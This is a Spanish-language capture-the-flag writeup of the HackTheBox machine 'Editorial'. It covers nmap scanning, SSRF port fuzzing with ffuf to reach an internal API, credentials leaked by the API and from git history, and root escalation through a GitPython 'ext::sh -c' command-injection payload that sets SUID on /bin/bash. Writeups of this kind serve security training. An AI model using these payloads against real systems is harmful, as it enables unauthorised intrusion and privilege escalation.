---
title: "Editorial"
date: 2025-05-29 16:41:29 +0200
categories: writeups HackTheBox
tags: máquina ssrf apiabuse infoleak gitpython linux sudoers api
description: Writeup de la máquina Editorial de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Reconocimiento

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107172204.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.20`.
### Nmap

En segundo lugar, realizaremos un escaneo usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.20 -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos los puertos **22 y 80**.

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107172408.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 10.10.11.20 -oN targeted
```

Lo más interesante que podemos ver la captura de **Nmap** es que la página web está bajo el dominio **editorial.htb**.

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107172444.png>)
___
## Explotación

Si intentamos acceder a la página web veremos que nos redirige a **editorial.htb** tal y como nos ha reportado **Nmap**, para solucionar este problema añadiremos la siguiente línea al `/etc/hosts`:

```bash
10.10.11.20 editorial.htb
```

Gracias al **Virtual Hosting** podemos ver correctamente la página web y nos daremos cuenta que en la sección de **about** observamos un correo electrónico (**submissions\@tiempoarriba.htb**):

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107172833.png>)

Como en la página de inicio tampoco hemos encontrado nada interesante pasaremos a ver la última página (**/upload**) en la cual podemos publicar un libro. Además nos daremos cuenta que para publicarlo hemos de subir una foto de la portada de un libro, para realizar esto podemos incluir la imagen a través de una **URL** o subiéndola.

A continuación, nos montaremos un servidor con python (`python3 -m http.server 80`), en la **URL** para incluir la imagen de nuestra portada pondremos nuestra **Dirección IP** y le daremos al botón de **Preview**:

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107173201.png>)

Veremos que al darle a dicho botón recibiremos una petición por lo nos plantearemos subir un **cmd.php** pero el servidor no es capaz de interpretar **php**.

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107173947.png>)

Capturaremos la petición gracias a **FoxyProxy** y **BurpSuite**, posteriormente enviaremos dicha petición al **Repeater** y observaremos que cuando subimos una imagen la respuesta nos devuelve la ruta donde está se ha almacenado. 

Si accedemos a una **ruta que existe** nos subirá la imagen y la almacenará para ponerla como portada de nuestro libro:

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107174421.png>)

Si accedemos a una **ruta que no existe** nos pondrá como foto de la portada la imagen por defecto:

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107174442.png>)

A continuación veremos como es la imagen por defecto:

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107175210.png>)
### SSRF

Tras estar un buen rato pensado se me ocurre probar un ataque de tipo **SSRF** pues tenemos una forma de saber si estamos apuntando a un servidor que existe y con suerte descubriremos uno montando internamente.

Para descubrir un servidor interno nos guardaremos en una fichero la petición del **BurpSuite** y le añadiremos la palabra **FUZZ** la cual irá siendo reemplazada por puertos:

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107180118.png>)

Usaremos un diccionario que vaya desde el 1 al 65535 (`seq 1 65535 > ports.txt`), iremos sustituyendo cada puerto por la palabra **FUZZ** para así poder descubrir un puerto interno en el caso de la respuesta tenga una longitud diferente a **61**:

```bash
ffuf -c -u http://editorial.htb/upload-cover -w ports.txt -request req.req -fs 61
```

Tal y como vemos a continuación el puerto **5000** se encuentra abierto internamente.

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107180102.png>)

Tal y como hemos visto antes debemos de tener en cuenta que nuestro archivo se sube temporalmente a una ruta la cual podemos verla en la respuesta a nuestra petición. Si intentamos acceder a dicha ruta a través del navegador nos intentará descargar el archivo pero si accedemos con **curl** podremos ver su contenido:

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107182057.png>)

Si realizamos una petición al puerto interno descubierto (**http\://localhost:5000**) y posteriormente mediante **curl** accedemos a la ruta que nos devuelve la respuesta veremos que el contenido de dicha página es el siguiente:

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107181521.png>)

Tal y como hemos visto antes en el puerto **5000** se encuentra alojada una **API** de la cual podemos ver un montón de **endpoints**.

Par realizar las petición a dicha **API** más cómodamente me crearé el siguiente script en **bash**:

```bash
#!/bin/bash

if [ $# -ne 1 ]; then
  echo -ne "\n[!] Debes de introducir la ruta a donde quieres realizar la petición.\n"
  exit 1
fi

url=$1

curl -s http://editorial.htb/$1 | jq
```

En este punto iremos realizamos peticiones a los diferentes **endpoints** de la **API** a través del **SSRF**. Cuando realicemos una petición **/api/latest/metadata/messages/authors** veremos unas credenciales (**dev:dev080217_devAPI!@**):

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107182946.png>)

Como el puerto **22** (**ssh**) está abierto probaremos a autenticarnos con dichas credenciales y veremos como conseguimos acceder correctamente a la máquina víctima.

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107183419.png>)

___
## Escalada de privilegios

> Destacar que para que nos funcione el <kbd>CTRL</kbd> + <kbd>L</kbd> (**clear**) debemos de hacer un `export TERM=xterm`.

Una vez que hemos ganado el acceso a la máquina buscaremos por la formas típicas para elevar nuestros privilegios pero no tendremos éxito. Además, nos daremos cuenta que lo más posible es que antes de elevar nuestros privilegios tendremos que realizar un Pivoting de usuarios a través del usuario **prod** y elevar nuestros privilegios desde este usuario.

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107191055.png>)

Tras un rato buscando diferentes formas de elevar nuestros privilegios nos daremos cuenta que en nuestro directorio **home** hay un repositorio de **github**, mirando su log de **commits** nos llamará la atención uno de ellos el cual está realizando un **downgrading** de **prod** a **dev**.

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107190330.png>)

Gracias a `git show` podremos ver el **commit** en el cual observaremos la contraseña del usuario **prod** (**080217_Producti0n_2023!@**), dicho **commit** se encarga de mostrar la contraseña para el usuario **dev** ya que se está cambiando al entorno **dev**.

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107190400.png>)

Tal y como vemos a continuación conseguiremos autenticarnos como el usuario **prod**, además tenemos un permiso de **Sudoers** con el cual podemos ejecutar un script de python como el usuario **root**.

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107191802.png>)

El script sobre el cual tenemos permisos de **Sudoers** se encarga de clonar el repositorio que le pasemos como argumento tal y como podemos ver a continuación: 

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

# Cambia el directorio de trabajo actual al especificado.
os.chdir('/opt/internal_apps/clone_changes')

# Obtiene el primer argumento pasado desde la línea de comandos, que debería ser la URL del repositorio a clonar.
url_to_clone = sys.argv[1]

# Inicializa un nuevo repositorio Git vacío en el directorio actual (bare=True indica que será un repositorio "bare").
r = Repo.init('', bare=True)

# Clona el repositorio desde la URL especificada en el directorio 'new_changes'.
# La opción multi_options permite pasar opciones adicionales al comando Git, en este caso:
# "-c protocol.ext.allow=always" es una configuración para permitir el protocolo de clonación "ext::".
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])

```

Como se me ocurren pocas formas de abusar de este exploit veré la versión que tiene la librería de **GitPython** tal que así:

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107192704.png>)

Buscaré en internet algún exploit correspondiente a la versión **3.1.29** de la librería **GitPython** y me encontraré con estos dos enlaces:

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107193436.png>)

En el segundo enlace podemos ver el **PoC** el cual nos recuerda al script sobre el cual tenemos permisos de **Sudoers**, como bien sabemos la parte que se encuentra marcada en rojo tenemos control sobre ella por lo que pasándole como argumento al script lo siguiente: `ext:sh -c <comando>` podemos lograr ejecutar comandos como **root**.

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107193541.png>)

Para comprobar que podemos ejecutar comandos como **root** crearemos un archivo en el directorio **/tmp**, en definitiva hemos de ejecutar el siguiente comando: 

```bash
sudo -u root /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c touch% /tmp/pwned"
```

Tal y como vemos a continuación hemos conseguido crear un archivo en **/tmp** por el usuario **root**:

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107193125.png>)

Una vez que hemos logrado ejecutar comando como **root** asignaremos permisos **SUID** a la **/bin/bash** de la siguiente forma:

```bash
sudo -u root /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c chmod% +s% /bin/bash"
```

Observamos que la **/bin/bash** obtiene permisos **SUID** por lo que ya nos habremos convertido en el usuario **root** de manera efectiva (**efective user id**).

> Otra alternativa válida de convertirnos en **root** es a través de una **Reverse Shell**, o también introduciendo nuestra **id_rsa.pub** en el **authorized_keys** del **root**.

![](<../assets/images/posts/2025-05-29-editorial/Pasted image 20250107194626.png>)